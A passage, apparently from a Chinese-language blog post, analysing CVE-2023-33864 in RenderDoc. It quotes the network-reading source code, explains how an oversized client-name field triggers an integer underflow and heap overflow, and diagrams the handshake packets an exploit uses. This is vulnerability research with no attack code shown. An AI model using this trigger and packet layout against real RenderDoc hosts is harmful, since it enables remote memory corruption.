        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// see if we have a client</span>
    <span class="p">{</span>
      <span class="n">SCOPED_LOCK</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientLock</span><span class="p">);</span>
      <span class="n">existingClient</span> <span class="o">=</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">kick</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// forcibly close communication thread which will kill the connection</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
      <span class="n">Threading</span><span class="o">::</span><span class="n">JoinThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
      <span class="n">Threading</span><span class="o">::</span><span class="n">CloseThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
      <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
      <span class="n">existingClient</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>
    <span class="p">{</span>
      <span class="n">SCOPED_LOCK</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientLock</span><span class="p">);</span>
      <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span> <span class="o">=</span> <span class="n">newClient</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// if we've claimed client status, spawn a thread to communicate</span>
    <span class="k">if</span><span class="p">(</span><span class="n">existingClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">||</span> <span class="n">kick</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">clientThread</span> <span class="o">=</span>
          <span class="n">Threading</span><span class="o">::</span><span class="n">CreateThread</span><span class="p">([</span><span class="n">version</span><span class="p">,</span> <span class="n">client</span><span class="p">]</span> <span class="p">{</span> <span class="n">TargetControlClientThread</span><span class="p">(</span><span class="n">version</span><span class="p">,</span> <span class="n">client</span><span class="p">);</span> <span class="p">});</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="c1">// if we've been asked to kick the existing connection off</span>
      <span class="c1">// reject this connection and tell them who is busy</span>
      <span class="n">WriteSerialiser</span> <span class="n">ser</span><span class="p">(</span><span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Nothing</span><span class="p">),</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Stream</span><span class="p">);</span>

      <span class="n">ser</span><span class="p">.</span><span class="n">SetStreamingMode</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>

      <span class="n">rdcstr</span> <span class="n">target</span> <span class="o">=</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">GetCurrentTarget</span><span class="p">();</span>
      <span class="p">{</span>
        <span class="n">SCOPED_SERIALISE_CHUNK</span><span class="p">(</span><span class="n">ePacket_Busy</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">TargetControlProtocolVersion</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
        <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="c1">// don't care about errors, we're going to close the connection either way</span>
      <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
  <span class="c1">// don't join, just close the thread, as we can't wait while in the middle of module unloading</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">CloseThread</span><span class="p">(</span><span class="n">clientThread</span><span class="p">);</span>
  <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">ReleaseModuleExitThread</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>client向server请求建立调试的过程中，client首先向server发送握手包表明自身身份，其中包含了请求标识“client name”，server在处理“client name”的时候，首先实例化一个 StreamReader 对象用于网络通信，该对象内部有一个64KB的堆缓冲区m_BufferBase 用于暂存网络数据，m_InputSize 指示已经读取的字节数，m_BufferHead 指示下一次写入的位置，m_BufferSize 指示缓冲区的大小为64KB。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// streamio.cpp</span>

<span class="mi">42</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">initialBufferSize</span> <span class="o">=</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
 <span class="p">..</span>
 <span class="mi">92</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">StreamReader</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="n">Ownership</span> <span class="n">own</span><span class="p">)</span>
 <span class="mi">93</span> <span class="p">{</span>
 <span class="mi">94</span>   <span class="n">m_Sock</span> <span class="o">=</span> <span class="n">sock</span><span class="p">;</span>
 <span class="mi">95</span>
 <span class="mi">96</span>   <span class="n">m_BufferSize</span> <span class="o">=</span> <span class="n">initialBufferSize</span><span class="p">;</span>
 <span class="mi">97</span>   <span class="n">m_BufferBase</span> <span class="o">=</span> <span class="n">AllocAlignedBuffer</span><span class="p">(</span><span class="n">m_BufferSize</span><span class="p">);</span>
 <span class="mi">98</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span><span class="p">;</span>
 <span class="mi">99</span>
<span class="mi">100</span>   <span class="c1">// for sockets we use m_InputSize to indicate how much data has been read into the buffer.</span>
<span class="mi">101</span>   <span class="n">m_InputSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>SerialiseValue 函数用于解析握手包的字段，读取长度字段解析出 “client name”字符串的长度，调用resize函数分配 string buffer， 保存“client name”所需的堆块，然后从网络读取 “client name” 并保存。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// D:\sourceinsight工程\renderdoc\renderdoc\renderdoc\serialise\serialiser.h</span>

<span class="mi">1307</span>   <span class="kt">void</span> <span class="n">SerialiseValue</span><span class="p">(</span><span class="n">SDBasic</span> <span class="n">type</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">byteSize</span><span class="p">,</span> <span class="n">rdcstr</span> <span class="o">&amp;</span><span class="n">el</span><span class="p">)</span>
<span class="mi">1308</span>   <span class="p">{</span>
<span class="mi">1309</span>     <span class="kt">uint32_t</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="mi">1310</span>
<span class="mi">1311</span>     <span class="k">if</span><span class="p">(</span><span class="n">IsReading</span><span class="p">())</span>
<span class="mi">1312</span>     <span class="p">{</span>
<span class="mi">1313</span>       <span class="n">m_Read</span><span class="o">-&gt;</span><span class="n">Read</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
<span class="mi">1314</span>       <span class="n">el</span><span class="p">.</span><span class="n">resize</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">len</span><span class="p">);</span>
<span class="mi">1315</span>       <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
<span class="mi">1316</span>         <span class="n">m_Read</span><span class="o">-&gt;</span><span class="n">Read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">el</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">len</span><span class="p">);</span>
</code></pre></div></div>

<p>若读取的数据长度超过10MB，那么进入ReadLargeBuffer函数，ReadLargeBuffer把数据直接拷贝进入string buffer。</p>

<p>若小于10MB，那么先从网络读取数据到m_BufferBase，再从m_BufferBase拷贝数据到string buffer。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">139</span>   <span class="n">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="mi">140</span>   <span class="p">{</span>
<span class="p">...</span>
<span class="mi">183</span>         <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="n">Available</span><span class="p">()</span> <span class="o">+</span> <span class="mi">128</span> <span class="o">&lt;</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="mi">184</span>         <span class="p">{</span>
<span class="mi">185</span>           <span class="n">success</span> <span class="o">=</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">numBytes</span><span class="p">);</span>
</code></pre></div></div>

<p>若是读取大于10MB的数据，除了末尾的 128 字节，之前的部分被直接通过 socket 读取进入 string buffer，这个过程在函数 ReadFromExternal 里面。</p>

<p>末尾的128字节先通过 socket 读取到 m_BufferBase 里面，再从 m_BufferBase 拷贝到 string buffer。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">271</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">272</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">275</span>   <span class="n">byte</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">297</span>     <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">304</span>       <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span>
<span class="mi">305</span>
<span class="mi">306</span>       <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">350</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">354</span>   <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">...</span>
<span class="mi">357</span>   <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
<span class="mi">358</span>     <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</code></pre></div></div>

<p>读取末尾128字节之前的内容进入到string buffer中，更新 m_InputSize 字段，完成了一个字段内容的读取。</p>

<p>在完整接收数据的前提下，为了尽可能地提高程序运行的效率，继续利用 string buffer 未使用的空间来保存下一次解析的内容。</p>

<p>计算 m_BufferBase 缓冲区有待接收的数据长度，利用 string buffer 继续保存。</p>

<p>漏洞点就在这里，因为 m_BufferSize = 64KB，m_InputSize是一个大于等于10MB的值，相减之后发生了整数溢出，bufSize 变成了一个极大的 uint32 类型的值，接下来就会往 string buffer里面写入任意长度的数据。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p>那么在 ReadLargeBuffer 函数的354行，读取剩下的128字节进入m_BufferBase缓冲区的时候，同样也可以往 m_BufferBase 里面写入任意长度的数据，造成堆溢出。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">271</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">272</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">275</span>   <span class="n">byte</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">297</span>     <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">304</span>       <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span>
<span class="mi">305</span>
<span class="mi">306</span>       <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">350</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">354</span>   <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">...</span>
<span class="mi">357</span>   <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
<span class="mi">358</span>     <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="握手包的结构">握手包的结构</h2>

<p>renderdoc私有调试协议是作为TCP协议的载荷进行传输的。</p>

<p>exp用到了以下2种握手包</p>

<p>格式一：不包含 callstack 信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x2  handshake flag                    |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x0                                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        1 or 0 (kick or not)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

</code></pre></div></div>

<p>格式二：包含 callstack 信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     0x2 ｜ 0x10000     handshake with callstack information   |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                callstack size （sizeof(unsigned long)）        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     callstack information                     |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x1 callstack num                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          0x80 bytes                           |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      1 or 0 (kick or not)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>

<h2 id="io-过程分析">I/O 过程分析</h2>

<h3 id="io相关的数据结构与算法">I/O相关的数据结构与算法</h3>

<p>（这一块要讲，不然后面无法理解 exp 载荷部分为什么要那么写）</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg" alt="renderdoc-第 4 页.jpg" /></p>

<p>renderdoc 使用了高效的 TCP 通信方式，体现在如下两点：</p>

<ul>
  <li>维护了一个网络数据缓存，通过超量读取数据的方式缓存网络数据，减少了网络协议栈的开销;</li>
  <li>接收超大数据（≥10MB）的时候不缓存，直接操作用户缓冲区，减少了数据的拷贝；</li>
</ul>

<p>首先我们要知道 server 接收的数据放在哪里。</p>

<p>前面提到 server 实例化了 StreamReader 对象来进行网络通信，StreamReader 对象里面的m_BufferBase 成员指向了网络数据缓存，缓存的长度初始化为 64KB。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// streamio.cpp</span>

 <span class="mi">42</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">initialBufferSize</span> <span class="o">=</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
 <span class="p">..</span>
 <span class="mi">92</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">StreamReader</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="n">Ownership</span> <span class="n">own</span><span class="p">)</span>
 <span class="mi">93</span> <span class="p">{</span>
 <span class="mi">94</span>   <span class="n">m_Sock</span> <span class="o">=</span> <span class="n">sock</span><span class="p">;</span>
 <span class="mi">95</span>
 <span class="mi">96</span>   <span class="n">m_BufferSize</span> <span class="o">=</span> <span class="n">initialBufferSize</span><span class="p">;</span>
 <span class="mi">97</span>   <span class="n">m_BufferBase</span> <span class="o">=</span> <span class="n">AllocAlignedBuffer</span><span class="p">(</span><span class="n">m_BufferSize</span><span class="p">);</span>
 <span class="mi">98</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span><span class="p">;</span>
 <span class="mi">99</span>
<span class="mi">100</span>   <span class="c1">// for sockets we use m_InputSize to indicate how much data has been read into the buffer.</span>
<span class="mi">101</span>   <span class="n">m_InputSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>StreamReader 类里面网络 IO 相关的成员如下，其中公共成员 Read 函数用于从套接字接收数据，接收数据的长度 numBytes 由<strong>调用者</strong>保障，确保不发生缓冲区溢出，data 指向使用者的缓冲区。</p>

<p>StreamReader ::m_BufferBase 指针指网络数据缓存。</p>

<p>StreamReader::Read 函数从套接字接收数据先缓存到 m_BufferBase 里面，再根据使用者的需求拷贝 numBytes 个字节到参数 data 指向的用户缓冲区。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">StreamReader</span>
<span class="p">{</span>
<span class="nl">public:</span>
	<span class="c1">// 从套接字读取数据</span>
	<span class="kt">bool</span> <span class="n">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">){</span> <span class="p">......</span> <span class="p">}</span>
	
<span class="k">private</span><span class="o">:</span>
  <span class="c1">// base of the buffer allocation, 指向网络缓冲区，长度64KB</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">m_BufferBase</span><span class="p">;</span>

  <span class="c1">// where we are currently reading from in the buffer, 网络缓冲区读指针</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">m_BufferHead</span><span class="p">;</span>

  <span class="c1">// the size of the buffer (just a window if reading from external source)</span>
  <span class="kt">uint64_t</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="c1">// the total size of the total input. This is how many bytes you can read, regardless</span>
  <span class="c1">// of how many bytes might actually be stored on the other side of the source (i.e.</span>
  <span class="c1">// this is the uncompressed output size)</span>
  <span class="kt">uint64_t</span> <span class="n">m_InputSize</span><span class="p">;</span>  <span class="c1">// 从套接字已经读取的字节数</span>

  <span class="c1">// socket, if we're reading from a socket</span>
  <span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">m_Sock</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>   <span class="c1">// 套接字封装</span>

  <span class="c1">// the offset in the file/decompressor that corresponds to the start of m_BufferBase</span>
  <span class="kt">uint64_t</span> <span class="n">m_ReadOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">};</span>
</code></pre></div></div>

<p>StreamReader::Read 函数穿透到底层调用的是 ReadFromExternal 函数，buffer 参数通常是指向网络数据缓存 m_BufferBase，length 是期望接收到的数据长度，由调用者检查数据长度，避免缓冲区溢出。</p>

<p>ReadFromExternal 函数操作套接字接收网络数据，在调用过程中会发生 2 次数据接收：</p>

<p>第一轮接收数据在接收完 length 个字节的数据之前，线程会一直<strong>阻塞</strong>，确保length长度的数据完整接收，因为这 length 个字节数据是用户请求、并且当前还未接收的数据，是属于当前紧急处理的事项。</p>

<p>第二轮接收数据是<strong>非阻塞</strong>式的，在第一轮接收成功之后，在确保 m_BufferBase 缓冲区不溢出的情况下，尽可能多的接收数据，作用是为后续的用户请求缓存数据，避免重复传输，减小网络开销。</p>

<p>在 renderdoc 的客户端实现中，当一个数据包内容确定下来后，在 server 请求的数据之外也会尽可能多地传输下一阶段需要用到的数据。server 通过上述机制缓存多余的数据，等解析到那些字段的时候就不用再向 client 请求。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>       <span class="c1">// 阻塞式recv，确保全部读取了length个字节的数据</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p>以上复杂的 I/O 流程需要一套读写指示器来管理缓冲区的内容，所以就需要用到 StreamReader 类的  3 个成员变量：m_BufferBase、m_BufferHead、m_InputSize</p>

<p>m_BufferBase 是网络数据缓存，初始长度为64KB；</p>

<p>m_BufferHead 是读指针，指向 m_BufferBase 中下一次读取的位置，其他地方要用数据就得从网络数据缓存里面读取，从哪里开始读取就通过 m_BufferHead 指示；</p>

<p>m_InputSize 记录当前从套接字读取的数据总量。</p>

